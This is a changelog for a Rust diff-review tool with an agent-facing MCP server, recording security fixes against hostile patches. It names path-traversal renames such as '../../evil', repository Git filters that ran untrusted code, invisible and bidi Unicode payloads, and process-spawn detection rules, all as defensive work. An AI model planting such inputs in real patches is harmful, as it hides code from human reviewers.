  scanned as code up to its matching closer on the line. Inside it, strings are strings again, a
  backslash escapes, JS comments are comments, a shell `case` pattern's `)` is not a closer and
  a Python format spec is text, so neither a quoted closer hides the code after it nor a quoted
  token (`$(printf 'curl failed')`) is read as code. Single-quoted shell and plain or bytes
  Python strings still run nothing and stay blank.
- **The scanner errs toward code.** Three review rounds (226 agents) found ways a misread quote
  hid the rest of a line, most of them older than this change. Now:
  - a string still open at the end of a line (outside Rust) is read as code from its quote;
  - shell `#` is a comment only at a word start (`$#`, `${x#y}`, `a#b` are code);
  - a backslash escapes at the top of shell and JS lines;
  - ANSI-C `$'…'` strings honour escapes;
  - a JS regex literal's quotes open nothing, and a JS quote right after a word (JSX text,
    `Can't`) opens nothing;
  - nested Python triple quotes are known;
  - shell `case` is known after any command start (`if`, `while`, `!`, `time`, a pattern's
    `)`), `esac` only as a whole word that is not a pattern alternative;
  - a JS regex starts after an operator other than `<` and `>` (which open JSX tags), after `=>`
    and after a `return`/`typeof`-like keyword, not after `a++`, a property or a TypeScript
    non-null assertion (`x! / y`); a line that starts with `/` reads the previous line's last
    code byte; one failed regex probe ends probing, so a hostile line stays linear;
  - Rust raw strings (`r"…"`, `br#"…"#`) do not escape, so `r"C:\"` no longer hides the rest
    of its line.

  Not covered: triple-quoted f-strings, interpolations that span lines, continuation lines of
  multi-line strings (read as code), non-ASCII spellings of a token, JSX text, and a regex right
  after `if (…)`. The scanner is a reviewer's lens, not an adversarial boundary: no evidence
  means no token was found, never that a change is safe.
- **A JS `child_process` import is `process_spawn` evidence.** Before, the module name was only
  ever seen inside a string, which the code view blanks, so the rule could not fire. Imports are
  read through the code view (`require`, `module.require`, `import(…)`, `import …`, `from …`;
  any spacing or parentheses, any quote kind, `node:` optional). Comments, strings, regexes, `import type`/`export type` statements and
  `typeof import(…)` do not count; an `import(…)` type annotation does.
- `sanitize_body` (agent annotations, and now findings) drops bidi, invisible and
  line-separator characters as well as control characters. Before, Unicode category Cf
  characters such as U+202E were kept, so an agent's note could reorder or hide text for the
  next reader. `deep_diff_forge_core::is_unsafe_in_untrusted_text` is the one predicate.

## [0.4.0] - 2026-10-30

### Added

- **`deploy doctor [--json] [--socket PATH]`** checks that this machine can run the daemon and
  Git inputs, and changes nothing: the socket directory, the socket (absent, live, stale, of
  another user, or not a socket), the start lock, and `git version` (run the way an acquisition
  runs Git, within 10 s). The daemon checks apply the daemon's own start rules and never take the
  start lock. Exit 6 when a check fails; `--json` prints `deep-diff-forge.deploy-doctor.v0`.
- `deep_diff_forge_daemon::inspect` (with `Inspection`, `SocketState`, `LockState`, `DirState`)
  and `SocketLocation::start_lock_path`: a read-only view of a daemon location.
- `deep_diff_forge_patch::git_version`: Git's version line, bounded like an acquisition.

### Security

- **The daemon serves its own user only** (closes a 0.3.0 residual risk). Each accepted
  connection's effective uid is read from the kernel (`SO_PEERCRED` on Linux, `getpeereid` on
  macOS and the BSDs; other platforms refuse every client), and a client of another user is
  dropped and logged, whatever the socket's mode. The CLI, the Rust SDK (`SocketLocation::connect`)
  and the Python SDK (`SocketClient`) check the daemon's uid the same way and refuse a daemon of
  another user before sending anything; the CLI says `cannot use the daemon at PATH` (exit 6)
  rather than `no daemon at`.

### Fixed

- **The daemon runs requests in parallel** (closes a 0.3.0 residual risk). Before, every
  connection shared one `Mutex<Engine>`, so one slow request delayed every other client. Only
  the session table is locked now, and only for bookkeeping; parsing, ranking and Git run
  outside it. Admission caps the request bytes in flight at 128 MiB, first come, first served
  (`review.change` weighs the 64 MiB patch budget; a request heavier than the cap runs alone).
  Measured: six clients ranking a 2.75 MB patch, 23.4 to 56.8 requests per second;
  `daemon.health` under that load, 205 ms to 0.2 ms. A panic while the session table is held
  empties it; any other panic leaves every session in place. A request whose turn does not
  come within 30 s is answered `RESOURCE_EXHAUSTED` ("the daemon is busy") and gives up its
  place in the queue.
- CLI daemon tests kill their daemon when an assertion fails first (`Child` is not killed on
  drop); a mutation run had left one serving for 31 hours.

- **Two `daemon start`s can no longer race** (closes a 0.3.0 residual risk). Before, between the
  stale-socket probe and the bind, a second start could remove the first's fresh socket and bind
  its own, leaving the first running but unreachable. A start now takes a non-blocking exclusive
  `flock` on `<socket>.lock` before the probe and holds it until the daemon exits; a start that
  finds it held exits 6. The lock is opened without following symlinks and must be a regular file
  owned by the effective user.

### Changed

- **Breaking (daemon crate):** `dispatch`, `process_line` and `handle_connection` take
  `&Engine` instead of `&mut Engine` or `&Mutex<Engine>`; `Engine` is `Send + Sync` (checked at
  compile time). `MethodSpec` gains `work: Work`. New: `Admission`, `Permit`,
  `MAX_IN_FLIGHT_BYTES`, `ADMISSION_WAIT`, `Busy`, `Work`, `request_weight`,
  `Engine::admission`.

- **macOS tests run on every pull request** and `macOS tests` is a required check. Before, the
  job ran only weekly, on manual runs and on release, and two macOS breaks in PR #44 were caught
  only by a manual run.
- **A weekly campaign** (`.github/workflows/campaign.yml`, Mondays 05:41 UTC and on demand):
  a 10-minute hostile daemon soak with real review work and leak checks, and an hour of fuzzing
  for every fuzz target, each target its own job; a crash keeps its input as an artifact.
- The daemon soak runs real review work from four concurrent clients in every iteration and
  checks RSS growth (over 32 MiB fails) and open-fd growth (over 4 fails) across a run of a
  minute or more; `--require-growth-check` fails a run too short to measure them.
  `scripts/security/test_daemon_soak.py` covers the checks, in CI and `just ci`.
- `scripts/fuzz_target.sh` is the one place that knows each fuzz target's seeds and input cap;
  CI's 10 s smoke and the campaign both use it, and it lists the targets from `fuzz/Cargo.toml`.
- `SocketLocation::bind`, `bind_secure` and `bind_explicit` return a `BoundListener` (the
  listener and its start lock; `listener()` borrows the socket) instead of a `UnixListener`.
- `deep-diff-forge-daemon` uses rustix's `fs` and `net` features, and `nix` (`socket`, `user`)
  outside Linux for `getpeereid`; that adds `memoffset` to the lock file for those targets only.

## [0.3.0] - 2026-10-29

Tagged `v0.3.0` on 2026-10-29 by owner decision. 0.3.0 is minor rather than patch because the
library APIs changed incompatibly since 0.2.1 (see *Changed*). 0.2.1 was never tagged, so this
release follows v0.2.0. The workspace reached 0.3.0 on 2026-10-28; the expert-circle, bug-hunt
and owner-decision entries below landed before the tag. crates.io publication stays on hold.

### Changed (owner decisions on the bug hunt, 2026-10-29)

- **A rename or copy that Git refuses is refused** (H1-09). `rename to ../../evil`, an absolute
  path, or a `.`, `..` or `.git` component in a rename or copy path now fails with exit 4
  (`InvalidPath`), as `git apply` fails with "invalid path". DDF used to show such a patch with a
  `path_traversal` hazard. A plain `---`/`+++` path keeps its hazard, since a non-Git diff may
  legitimately name `../`.
- **Copies are `copied`** (H1-09). A `copy from`/`copy to` file reported `modified`.
- **A mode-only change is `mode_changed`** (H4-07). Flipping the executable bit reported
  `type_changed`, which now means only that the object type changed (a file, a symlink or a
  submodule became another). A mode header that is not one to six octal digits is refused
  (`InvalidMode`), as `git apply` refuses it.
- **Symlinks and new executables are risk signals** (H4-07). `symlink_change` (+3) fires when a
  symlink is created, changed, removed or made from a file; `executable_bit` (+2) fires when a
  file becomes executable. A generated or vendored path keeps both.
- The TUI tree marks copies `C` and mode-only changes `X`.
- **The hostile daemon soak sends oversize and flood traffic** (H5-09). It checks a request of
  exactly 80 MiB is served and one byte more is refused with the connection closed; that with
  all 8 connection slots held a ninth is closed unanswered, and the daemon serves again once
  they leave; and that 32 concurrent clients get only valid answers or closed connections.

### Fixed (expert circle, 2026-10-28)

A seven-seat expert circle reviewed DDF as pioneer coding agents would use it: Claude Code, Codex,
Zen (pi) and four specialist personas. It found these defects, each reproduced with the 0.3.0
binary and each fixed with a test that fails on the old code.

- **A rewritten comment is never "formatting only".** In tree-sitter-rust a plain comment's text
  is no leaf token, so `structural` and `analyze` reported `// SAFETY: the pointer is valid` →
  `// SAFETY: trust me` as `reformat_only: true` with no change. A comment is now one token,
  compared byte for byte. A new fuzz target, `structural_soundness`, checks that
  `reformat_only` is claimed only when the sources differ in whitespace alone (1,077,956 runs,
  0 crashes, measured locally).
- **A path can lower a file's risk but never zero it.** `generated/`, `vendor/`, `dist/` and
  similar paths used to score 0, so a new `src/generated/x.rs` that spawns a process ranked below
  a one-line README edit. The patch author chooses the path. Such files now keep the base weight
  and their new, deleted or binary signal, without the source, size or API bonuses.
- **`highlight` prints line breaks.** It escaped each line feed as the text `\x0a`, so a file
  printed on one line. Every other control character is still escaped.
- **Parse errors quote at most 120 bytes of the offending line** and count the rest. A 2 MB
  line made a 2,000,074-byte error, in a terminal or an agent's context.
- **Every command answers `--help`** (exit 0) from one table that `--help` also prints. Before,
  only `review` did; the others exited 2, and `council --help` exited 4.

### Security (bug hunt, 2026-10-28)

- **Patch truth: lines Git ignores are refused, not read as headers** (H1-01, high). After a
  file's hunk, `new file mode`, `deleted file mode`, `rename to`, mode lines, a lone `+++` or a
  lone `--- /dev/null` changed the reviewed status or path, or made a phantom file, while `git
  apply` applied a plain modification. Mode lines even changed the rendered patch (644 became
  755). Extended headers are now admitted only before a file's `---`/`+++` or first hunk, a `+++`
  only right after its `---`, and a `---` only with its `+++`.
- **Input Git refuses as corrupt is refused** (H1-04): a signed hunk range (`@@ -+1`), a final
  hunk line without a line feed, `new file`/`deleted file` contradicting `/dev/null`, a new and
  deleted file, a new or deleted file that is also renamed or copied, or a new file with old lines.
  New errors: `MisplacedHeader`, `InconsistentHeader`, `UnterminatedLine` (all exit 4).
  Fuzzing found six such contradictions in the first rounds; each is a regression fixture, and
  the final rounds ran 5,778,549 (`patch_parser`) and 2,261,936 (`review_json`) inputs with no
  crash.

A team of five Sonnet bug hunters covered the whole stack: patch and core, daemon/rpc/MCP/SDKs,
CLI and council, analysis and TUI, CI/scripts/supply chain. Each finding was re-checked by an
independent false-positive checker before a fix.
- **Repository filters never run.** A clean or process filter defined in a repository's own
  configuration and named in its `.gitattributes` ran during working-tree acquisition
  (`--git-working-tree`, `review.change`), so reviewing a repository someone handed you ran their
  code. Every filter the local configuration defines is turned off for each Git call; the user's
  global filters, such as Git LFS, stay on.
- **`review.change` refuses foreign Git directories.** A `.git` file inside an allowed root could
  point at a repository outside it. The top level, the Git directory and the common directory must
  all be under an allowed root, and an object store with alternates is refused.
- **The Git time limit holds** even when a child Git started keeps its pipes open.
- **The daemon refuses params a method does not take**, so a misspelt guard such as
  `require_file` no longer passes an empty review. MCP enforces its schema enums.
- `highlight` keeps line breaks without colour too (the earlier fix covered only colour).
- **An edit inside a multi-line comment is analyzed.** `analyze` attributed a changed token to a
  hunk by its first line only, so with `diff -U0` a rewritten `SAFETY:` line inside a block
  comment produced no semantic span while coverage still said `analyzed`. A token now belongs to
  the first hunk holding any of its lines, and a changed token no hunk holds makes coverage
  `partial_lcs`.
- The daemon soak no longer passes its memory bound with no RSS sample (no `/proc`), checks that
  a stopped daemon removed its socket, and logs the daemon to a file instead of a pipe nobody
  drained.
- **A rename out of `.git` is hazardous too.** Renaming `.git/hooks/pre-commit` to `src/y.rs`
  scored no signal while the reverse rename raised `hazardous_text`; the path a rename or copy
  leaves now counts.
- **Headless probes show what a terminal shows.** `review --probe` printed a space after each
  wide character (`界 界`), so its lines measured wider than the terminal they describe; the
  cell a wide character covers is skipped now.
- **The command panel wraps.** At 80 columns the notes panel cut the hazard warning after "what
  you see", losing "may not be what applies."; each panel line wraps at the panel width.
- A semantic note counts each change kind (`3 node added, 1 node removed`) instead of naming
  every span after the first one's kind.
- **A submodule change is captured whatever configuration says.** `diff.ignoreSubmodules = all`,
  from any configuration level, or a `.gitmodules` `ignore = all` dropped a staged submodule
  change from `--git-*` and `review.change` with exit 0, so a gate saw no files. Every
  acquisition now passes `--ignore-submodules=none`.
- **`review.change` names what it did not capture.** An untracked nested repository is not in
  the files; only the CLI's stderr said so. The `acquisition` member now lists it under
  `omitted_untracked`.
- A `GitAcquireOptions::byte_budget` of `usize::MAX` no longer wraps to a zero-byte read.
- **One output mode at a time.** `--outline --hunks` printed the outline, `--rank --cluster` one of
  the two, and `--outline --path`/`--address` dropped the selector, all with exit 0. Each is now
  a usage error (exit 2) before any input is read.
- **`git format-patch` output is read.** Its bare `---` before the diffstat and its `-- `
  signature were refused as body lines outside a hunk, so `git format-patch -1 --stdout |
  deep-diff-forge --stdin-patch` exited 4. Git ignores both outside a hunk; so does DDF now,
  for those exact lines only.
- **View pages hold their budget on every surface.** Each was reproduced before the fix:
  - A 200 KB `@@` heading made a 1 KiB page 200,616 bytes and repeated on every continuation
    page. A view now carries at most 256 bytes of a heading, flagged `section_truncated`
    (`review.v0` keeps it whole).
  - MCP view answers ran to 1.39× `max_bytes`, because the escaped text copy grows past half.
    They are now re-paged smaller (`views::fit_emitted`) until the whole result fits.
  - The CLI printed views indented but budgeted them compact (4,688 bytes for
    `--max-bytes 4096`). It now prints the daemon's one-line page.
- **A path or address selects every match.** `paths` returned only the first section of a path
  that a concatenated patch names twice, and `addresses` the first of two identical hunks.
- **`highlight` is bounded by nesting depth.** Its query cost grows with depth, not size: a
  60,000-deep brace nest took 58 s (debug) and 20 s (release) to highlight, while the same node
  count laid out flat took 0.14 s. Past 4,096 levels or the 200,000-node budget `semantic` uses,
  `highlight` prints plain text; the deep nest now returns in 0.16 s.
- **A comment's line ending is formatting.** A line comment's token held its line feed, so CRLF
  conversion or a trailing space made `structural` and `analyze` report a rewritten comment. Each
  comment line's trailing whitespace is dropped from its token; a changed word still counts.
- **The cockpit refuses a patch that names a path twice.** `review` matched content and notes
  by path, so two concatenated patches touching one file showed the first section's content and
  notes for both, and the second section was never shown. It now exits 4 and names the path;
  `deep_diff_forge_tui::duplicate_path` finds it for library callers.
- **Hazards cover the invisible-payload classes.** Word joiners and invisible operators
  (`U+2060–2064`), the soft hyphen, the combining grapheme joiner, the Mongolian vowel separator,
  the Hangul fillers, variation selectors (`U+FE00–FE0F`, `U+E0100–E01EF`) and tag characters
  (`U+E0000–E007F`) were neither flagged nor escaped. They are now `invisible` and shown as
  `\u{XXXX}` on a terminal. The line and paragraph separators `U+2028`/`U+2029` are `control`.
  A path that ends in a carriage return (a CRLF-converted header) is `control` too; only a body
  line's CRLF is exempt.
- **No JSON record splits on a Unicode line break.** A path or line holding `U+2028`/`U+2029`
  left `--json`, `--jsonl`, `rpc`, MCP and the daemon socket raw, so a line-aware reader
  (Python's `splitlines`, JavaScript before ES2019) saw one record as two. `json_escape` now
  escapes both, and the serde-built lines pass through the new `core::json_line_safe` before
  they are written; the parsed values are unchanged.

### Added (agent batteries)

- **`agent setup --client claude|codex [--allow-repo PATH]...`** prints the registration of this
  binary's MCP server: a `claude mcp add --scope user …` line and a `.mcp.json` block, or a
  `~/.codex/config.toml` table. It never writes a file. `--json` gives
  `deep-diff-forge.agent-setup.v0`.
- **`agent doctor [--json]`** checks in-process that the MCP handshake and the seven tools'
  output schemas are in place, and that one patch gets the same sealed document from the CLI
  path, the daemon and MCP, the same ranking from `diff.rank` and `rank_patch`, and a bounded
  outline-then-hunk answer. It exits 101 if any check fails. A test runs it on every build.
- **Hazards** (expert circle, Sana Rahimi, narrowed by Zen to objective facts). The facts are:
  `bidi_control`, `invisible` and `control` on lines (a CRLF's carriage return excepted), and
  `path_traversal` and `git_internal` on paths.
  - They are reported in `review.v0` (only where found), in the views and in the outline.
  - A new risk signal, `hazardous_text` (+3), lifts such a file, even under a generated path.
  - The cockpit explains the signal.
- **`rpc` and the daemon name the framing** when a request line is cut short (the start of a
  pretty-printed object): one JSON value per line.

### Added (agent-first core)

The expert circle's Tier 1: an agent learns where to look before it reads anything large, and
never has to paste a patch.

- **Hunk addresses in `review.v0`** (additive): `address` (SHA-256 of `ddf-hunk-v1`, path,
  ranges and body: exactly this hunk of this patch), `body_sha256` (the body alone: it survives a
  move), `section` (the `@@` heading, display only, never re-rendered) and `old_lines` /
  `new_lines`.
- **Budgeted, sealed views.**
  - `review.outline` lists files in review-risk order with their hunks' addresses, ranges,
    headings and counts, and no line text.
  - `review.hunks` returns chosen hunks verbatim, by address or by path.
  - Both keep every answer within `max_bytes`, continue a long hunk at a line (never inside one),
    and page with a cursor bound to the patch and the selection.
  - They are available on the socket, over `rpc`, as the MCP tools `review_outline` and
    `review_hunks` (where `max_bytes` counts both copies of the answer), and on the CLI as
    `--outline` and `--hunks [--address A]... [--path P]... [--max-bytes N] [--cursor C]` for
    piped patches and Git selections alike.
  - Parity tests hold the CLI equal to the daemon page for page.
- **`review.change` and MCP `review_change`: review straight from Git.**
  - Selections are staged, working tree or range. The answer is the outline or hunks of the
    change, sealed over Git's exact bytes, with an `acquisition` member.
  - It reads only repositories whose canonical path and Git top level are under a root the
    operator allowed with `--allow-repo PATH`, on `mcp`, `rpc` and `daemon start`. Without one it
    reads nothing.
  - Tests cover an outside repository, an escaping symlink and a subdirectory of a larger
    repository.
- **Git subprocesses have a time limit** (closes a 2026-10-28 residual risk). One deadline bounds
  every Git call of an acquisition, 120 s for the CLI and 30 s for `review.change`. A Git still
  running is killed and the acquisition fails with `TimedOut` (exit 3) instead of hanging on a
  stalled filesystem or hook.

### Added

- **`diff.rank`**, a daemon method on the socket, `rpc` and MCP: the sealed
  `deep-diff-forge.rank.v0` document that `--stdin-patch --rank --json` prints, with the same
  input guards. A parity test holds it equal to the CLI on every fixture. The Python SDK gains
  `rank_patch`.
- **MCP tools declare an `outputSchema`,** and a test checks every tool's results against it.

### Changed

- **MCP `rank_patch` returns the sealed `rank.v0` object** (through `diff.rank`), and its
  summary keeps the seal. It used to return `diff.plan`'s bare array, which the MCP tools
  specification does not allow as `structuredContent`, and which could not say which bytes it
  ranked. `rank_patch` also takes `require_files` and `require_hunks`.

### Added (documentation and community)

- **The README is rewritten from the code.**
  - Three graphics: a terminal session generated from the binary's real output
    (`scripts/docs/render_terminal_svg.py`), an architecture diagram that adapts to light and
    dark themes, and a refreshed banner (14 crates, 1,354 tests).
  - A Mermaid crate graph drawn from `docs/crate-edges.txt`.
  - The risk-ranking weights from `risk.rs`.
  - The nine required checks.
  - The production-readiness verdict and its known limits.
  - A documentation map.
- **An open call for contributors:** `CONTRIBUTING.md` (setup, the quality bar, open problems
  worth owning), `CODE_OF_CONDUCT.md` (Contributor Covenant 2.1), issue forms for bugs and
  features, and a pull request template.
- **Every document under `docs/`, plus `SECURITY.md`, `EVIDENCE.md` and `NOTES.md`,**
  is checked against the code at 0.3.0:
  - target designs say what exists today;
  - ledgers and history carry a dated status block, and no past entry is rewritten;
  - surfaces that are refused today are labelled.

### Fixed (found while checking the docs against the code)

- **`review --cmd` refuses an unknown command name** (exit 2, naming the commands there are).
  Before, a typo fell through to `rank` and exited 0. A `--cols` or `--rows` value that is not a
  number is refused too; before, it silently became the default.
- **`--parallel` refuses anything but `serial`, `auto` or a count from 1** (exit 2). Before, an
  unreadable count ran as `auto`, and `0` was reported as `fixed:0` while one worker ran.
- **`analyze` with the wrong number of paths, or an option, exits 2** (fix the command line).
  Before, a missing path exited 4 (change the input).
- **`deploy release` no longer claims a GitHub release for an untagged version.**
  `github-release` is `blocked` until the owner tags, so `pending` lists it with crates.io. It
  used to report `published` for 0.2.1, which was never tagged.
- **A tag release runs the macOS tests.** `release.yml` calls `ci.yml` with the tag push's
  event, which the macOS job did not accept, so a tagged release would have shipped macOS
  binaries tested only by an earlier dry run.
- **`just release-tag` pushes the tag to `origin`.** It used to push to a remote named
  `github` that no checkout has. Its comment now describes the crates.io hold, not a token.
- `--help` no longer says learned scores set engine defaults; nothing reads them yet.
  `chain-contract` no longer promises a schema version on every JSONL record; each record names
  its event.

### Added

- **Every exit code names what to do next.** The registry gives each code an
  `action` (`proceed`, `fix_invocation`, `check_environment`, `change_input`,
  `review_evidence`, `report_bug`) and `may_be_transient`; `schema exit-codes`,
  `explain --json` and the MCP exit-code tools report both, and the README
  tables carry a checked Next column. A new code cannot be added without one.
- **A release dry run.** `release.yml` runs on `workflow_dispatch`: the quality
  and supply-chain gates and all three builds, with each executable binary
  smoke-tested and every archive's checksum verified, while releasing and
  attesting stay limited to tag refs. Tag releases get the same smoke and
  checksum checks before anything is published.
- **macOS tests.** A `macos` CI job runs the workspace tests on `macos-latest`
  weekly and on manual runs, including a dispatched release dry run.
- **Deployment resource requirements** in `docs/OPERATIONS_AND_DAEMON.md`: the
  measured memory of maximum-size requests and the `/tmp` inode limit.
- **The review JSON marks the line that was decoded lossily** (`"lossy": true`
  on the line), beside the per-file `lossy_lines` count, so a consumer need not
  guess from U+FFFD. Measured with a JSON-only rebuild sweep over 1,127 real
  commits: every other text file rebuilds to its exact blob.

### Added (slice C: SDKs)

- **Rust: the `deep-diff-forge-sdk` crate.** `review` (with `InputGuards`)
  returns a `Review` whose `to_json` is the CLI's review document byte for byte;
  `rank` orders it by risk; `exit` re-exports the registry; `Client` calls a
  running daemon. `Error` maps to the CLI exit codes. The public signatures are
  pinned by a compile-checked test, and a live in-process daemon test proves the
  client and the facade agree.
- **`deep-diff-forge rpc`:** the daemon's JSON-RPC over stdio, with no daemon.
  It uses the socket server's own line handler and request cap, and stops on
  `daemon.shutdown`.
- **Python client** (`sdk/python`, standard library only): `StdioClient` and
  `SocketClient`. Its tests check CLI parity over both transports and run in CI.

### Added (slice D: MCP server)

- `deep-diff-forge mcp`: a read-only, dual-era MCP server over stdio. It
  implements the 2026-07-28 specification (per-request `_meta`,
  `server/discover`, `resultType`, `UnsupportedProtocolVersion` -32022) and keeps
  the `initialize` handshake for 2025-11-25 and earlier clients. Its tools are
  `review_patch` (the daemon's `diff.compute`, the same JSON value as the CLI's
  document, tested over real stdio), `rank_patch`, `explain_exit_code` and
  `exit_code_registry`. All are annotated read-only. Domain refusals are tool
  errors (`isError`); malformed calls are protocol errors. Request lines are
  capped and stdout carries only protocol messages.

### Added (slice B: daemon parity, protocol 1)

- **Daemon `diff.compute`** returns the same `deep-diff-forge.review.v0` document
  as `--stdin-patch --json` for the same bytes, under the same input contracts
  (`require_files`, `require_hunks`). A parity test proves this across fixtures
  and guard combinations. The input-contract predicate moved to
  `deep_diff_forge_patch::InputGuards`, shared by both surfaces.
- **`engine.methods`** lists every method with its params, result and protocol
  version. `engine.initialize` reports the method names and refuses a protocol
  version it does not speak (domain error 2). Domain error 7 is an input-contract
  refusal, matching CLI exit 7.

### Added (slice A: CLI contract v1)

- `deep-diff-forge envelope -- <command…>` wraps any command's result in one
  `ddf.result.v1` JSON object: exit code, registry outcome, stdout (parsed when it
  is one JSON value), stderr, and any truncation. It runs the command as a child
  of the same binary with stdin passed through, leaves the command's own output
  unchanged, and exits with its code.
- `deep-diff-forge schema [result|exit-codes]` prints the envelope's JSON Schema
  (2020-12) or the exit-code registry. `deep-diff-forge explain <code> [--family
  engine|council] [--json]` names one code.
- One exit-code registry, by command family (`engine`, `council`), owned by
  `deep_diff_forge_core::exit` so the daemon and SDK slices can share it. Every
  exit site uses its constants, and a source-scan test forbids numeric exit
  literals. The engine meanings now say what the codes are used for: 3 is any I/O
  or encoding failure, 4 is any invalid input, and 101 is a panic (council sa1:
  the old "patch parse" label misnamed receipt and analysis errors). The README
  documents both tables, and a test fails if they drift from the registry.
- `envelope` keeps the command's exit code when its own reader closes the pipe;
  whitespace-only stdout stays text; the schema lists every emitted field as
  required and enumerates `outcome`.
- `--help` no longer says crates.io is blocked only by a missing token; it is on
  hold until the codebase is production-ready.

### Changed

- **The crates.io hold is a condition, not a missing secret.** The publish job
  runs only when the repository variable `DDF_CRATES_IO` is `open`; before, it
  ran on every tag and skipped only because no token was configured.
- **`rank_patch` is bounded like `review_patch`.** Above 256 KiB it returns a
  `deep-diff-forge.rank-summary.v0` with the highest-ranked files that fit and
  `omitted_files`.
- **Fallback reasons and semantic kinds have written-out wire names**
  (`FallbackReason::wire_name`, `SemanticChangeKind::wire_name`) instead of
  `Debug`; the bytes are unchanged.

- **CI runs on Ubuntu 26** (Luke's decision, a measured trial, 2026-10-27).
  Every CI job and the release workflow's supply-chain and publish jobs run on
  `ubuntu-26.04`. The trial measured rootless Podman 5.7.0 on Ubuntu 26.04.1
  (kernel 7.0.0): the AppArmor user-namespace restriction starts on, as on
  24.04; the existing guarded step lifts it; and all 12 planted-breach probes
  were refused. The Linux release binary is still built on `ubuntu-24.04`, so
  its glibc requirement keeps it running on older distributions.
- **GitHub and GitLab `main` share one history again** (Luke's decision,
  2026-10-27). GitLab `main` carried three commits from 2026-06-23 (review
  cockpit hardening) that GitHub never received; their code had already
  reached GitHub by another path. A merge joins the histories (the code is
  unchanged), so GitLab `main` fast-forwards with no force push. The two
  collaboration logs they added live under `docs/history/2026-06-23-review-cockpit/`.
- **One parse → guard → seal path** (anchor C-05; library API).
  `deep_diff_forge_patch::SealedReview::new` decodes, parses, applies the input
  contracts and seals the same bytes; the CLI's `--stdin-patch`, the daemon's
  `diff.compute` and the SDK's `review` all use it, and Git selections seal
  through `StructuredDiff::sealed_review` from the same capture.
  `to_json_sealed` is no longer public, so a seal can no longer be paired with
  files parsed from other bytes. Every output is byte-identical.
- **The design docs say they are target design** (anchor E-01).
  `SCHEMATICS.md`, `ARCHITECTURE.md` and `MODULE_STRUCTURE_PLAN.md` open with
  a target-design banner, and `SCHEMATICS.md` carries a generated "current
  crates and edges" block rendered from `docs/crate-edges.txt`; a test fails
  when the block is stale (`DDF_BLESS_SCHEMATICS=1` regenerates it).
- **`deploy status` says it ran nothing** (anchor E-06). Its gates are a
  static `not-run` list; the JSON now carries `"gates_run": false` so a caller
  cannot read `not-run` as a verdict, and the human output points at `just ci`.
- **Council fields that take a closed set are enums** (anchor C-02; library
  API). `Request.builder_family` (`BuilderFamily`), a challenge's
  `disposition` (`Disposition`) and `Assessment.state` (`AssessmentState`)
  were strings checked after parsing; an invalid value is now refused when it
  is read. The JSON is unchanged, and a test holds the reviewer-facing
  report schema's enum lists equal to the Rust enums.
- **The council grades only a verified manifest** (anchor C-01; library API).
  `load_manifest` returns a `SealedManifest`, which nothing else can construct,
  and `assess` takes it, so an in-memory `Manifest` that skipped the seal,
  request and artifact-digest checks can no longer be assessed. It reads as
  the `Manifest` it wraps.
- **`StructuralDiff` has one state, not three flags and an `Option`**
  (anchor C-06; library API). `state: StructuralState` is `Unavailable(reason)`,
  `Degraded`, `LineAnchored` or `Minimal { reformat_only }`, so combinations
  such as "reformat-only and unavailable" can no longer be built. The
  `reformat_only()`, `degraded()`, `minimal()` and `unavailable()` accessors
  report what the fields did, and every JSON output is byte-identical.
- **A learning receipt cannot carry a path** (anchor C-07; library API).
  `StrategyReceipt.file_hash` is a `RedactedId`, which only `redacted_id()`
  makes and which deserializing checks (16–64 lowercase hex characters), so a
  path is refused when a receipt is built or read, not only when it is stored.
  On disk the field is the same bare string. A load error now names its store
  line for malformed JSON too.
- **`InputGuards` has no `Default`** (anchor C-04; library API). "No guards"
  is written out as `InputGuards { files: false, hunks: false }`, so
  `..Default::default()` can no longer silently drop a contract a caller asked
  for; the SDK's `Guards` already worked this way. A `compile_fail` doctest
  holds it.
- **The test-count floor is retired** (anchor B-09). The 50-tests-per-crate
  rule was never enforced, and `just test-audit` always exited 0 (and read 0
  without `rg`); the project's own antipattern catalogue lists count literals
  as a false oracle. The Testing Gold Standard and the deployment docs now
  name diff-scoped mutation (0 missed in the changed code) as the coverage
  oracle, and the `test-audit` recipe is removed.
- README exit-code table gains code 7 and the recommended gate command now
  reads `--require-files --require-hunks`. The workspace has 1,192 passing tests
  (1 ignored), measured 2026-10-26 on the stage D tree; the 991 baseline is
  historical.
- The exemption control evolved through councils r10–r18: a skip-attribute
  lexer, then oracle spans (r12), differential MIR compilation (r13), the
  gate's own build (r14), proven test code (r15), five configurations (r16),
  an allow-list (r17) and `#[cfg(test)]` only (r18). Councils r18–r21 then
  hardened the evidence:
  - incremental state is removed before each build, and drift of the
    unmodified tree is inconclusive (r19–r20);
  - path dependencies are observed (r19);
  - a build script's `cfg(test)` is refused from cargo's own report (r19);
  - each unit's dep-info is held to an allow-list and fails closed (r20–r22);
  - the controller requires exactly the gate and release configurations and a
    clean outcome (r19–r20).

  A stop rule bounds further detectors (r21). Each step answered a council
  finding; `docs/REVIEW_COUNCIL.md` keeps the history.
- The skip-attribute lexer (about 580 lines) is retired (r13); the oracle is
  the single control. `code_lines` widening follows nested comments, attribute
  brackets, plain/byte/raw strings and character literals.
- The mutation job carries `CARGO_ENCODED_RUSTFLAGS=--emit=link,mir`, the same
  flag as the oracle's builds, so the two are indistinguishable by flags.
- CI runs every job on `ubuntu-24.04`, where the rootless-Podman step was
  measured; `ubuntu-latest` moves to Ubuntu 26, which will be its own measured
  change. `actions/checkout` (v4 → v7.0.1) and `softprops/action-gh-release`
  (v2 → v3.0.3) move to their Node 24 releases, pinned by SHA.
- Structural diff trims the common token prefix and suffix before the LCS and
  anchors oversize diffs on unchanged lines.
- CI: every toolchain pinned (stable 1.99.1, `nightly-2026-10-25`); the
  evidence job's mutation timeout raised to 300 s; the real-Podman sandbox
  suite runs on GitHub-hosted runners with canary (non-secret) credential
  files and prints job diagnostics on failure; pedantic clippy covers the
  no-default-features build and the fuzz crate; gitleaks 8.30.1 (checksum
  pinned) scans full history. `.gitignore` covers `__pycache__/`.

### Fixed

- **Patch parsing is linear in metadata lines.** Every non-body line rescanned
  all of the file's metadata, so 1M `index` lines (8 MB) took 139 s and held the
  daemon's engine past every client deadline; it now takes 0.20 s.
- **A refused learning receipt exits 4** (change the input), not 3 (a
  retryable I/O failure), as the README documents.
- **A second `daemon start` never replaces a live daemon's socket.** It
  exits 6 instead of orphaning the running daemon.
- **`daemon --socket PATH health` works.** Commands take their positionals
  from argument admission, so an option's value is never read as the
  subcommand. `--foreground` belongs to `daemon start` alone (which always
  serves in the foreground) and is refused elsewhere.
- **The daemon never sends a response over its 80 MiB line cap**; it answers
  `RESOURCE_EXHAUSTED` (8) for the same id instead of a line the client
  refuses. The README now says one engine serves the eight connections.
